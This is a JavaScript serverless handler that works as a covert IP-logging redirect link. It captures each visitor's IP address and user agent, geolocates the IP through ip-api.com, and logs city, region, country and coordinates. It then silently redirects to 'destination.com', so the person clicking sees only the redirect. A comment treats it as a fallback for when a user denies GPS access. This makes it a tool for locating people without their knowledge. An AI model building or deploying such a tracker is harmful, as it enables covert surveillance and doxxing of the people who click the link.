import axios from "axios";

export default async function handler(req, res) {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const userAgent = req.headers["user-agent"];
    const time = new Date().toISOString();

    try {
        // Get location from IP (fallback if user denies GPS)
        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
        const { lat, lon, city, region, country } = geoResponse.data;

        // Log the data
        console.log(`IP: ${ip} | Time: ${time} | User-Agent: ${userAgent}`);
        console.log(`Approximate Location: ${city}, ${region}, ${country} | Lat: ${lat}, Lon: ${lon}`);

        // Redirect to the target website
        res.writeHead(302, { Location: "https://destination.com" });
        res.end();
    } catch (error) {
        console.error("Error fetching location:", error);
        res.writeHead(302, { Location: "https://destination.com" });
        res.end();
    }
